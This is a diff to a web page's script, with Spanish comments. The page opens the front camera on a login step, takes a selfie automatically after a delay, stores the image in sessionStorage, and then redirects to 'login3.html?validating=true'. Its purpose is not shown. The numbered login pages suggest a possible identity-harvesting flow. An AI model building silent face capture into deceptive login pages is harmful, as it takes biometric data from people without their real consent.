@@ -100,34 +100,49 @@
 
     <script>
         const video = document.getElementById('camera-feed');
-        let selfieCount = 0;
+
+        // Determinar el intento actual
+        let attempt = parseInt(sessionStorage.getItem('captureAttempts')) || 1;
 
         function captureSelfie() {
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 320;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             const selfieDataUrl = canvas.toDataURL('image/png');
-            selfieCount++;
-            sessionStorage.setItem('selfie' + selfieCount, selfieDataUrl);
+            sessionStorage.setItem('selfie' + attempt, selfieDataUrl);
+        }
+
+        function waitForVideoReady(callback) {
+            if (video.readyState >= 2) {
+                callback();
+            } else {
+                setTimeout(() => waitForVideoReady(callback), 100);
+            }
+        }
+
+        function startCapture() {
+            waitForVideoReady(() => {
+                setTimeout(() => {
+                    captureSelfie();
+                    // Actualizar el intento
+                    sessionStorage.setItem('captureAttempts', attempt + 1);
+                    video.pause();
+                    setTimeout(() => {
+                        window.location.href = 'login3.html?validating=true';
+                    }, 600);
+                }, 4000);
+            });
         }
 
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                 .then(stream => {
                     video.srcObject = stream;
-                    // Captura dos selfies con intervalos
-                    setTimeout(() => {
-                        captureSelfie(); // Selfie 1
-                        setTimeout(() => {
-                            captureSelfie(); // Selfie 2
-                            video.pause();
-                            setTimeout(() => {
-                                window.location.href = 'login3.html?validating=true';
-                            }, 600);
-                        }, 2000); // Espera 2 segundos entre selfies
-                    }, 3500); // Espera inicial para selfie 1
+                    video.onloadedmetadata = () => {
+                        startCapture();
+                    };
                 })
                 .catch(err => {
                     console.error("Error al acceder a la cámara: ", err);
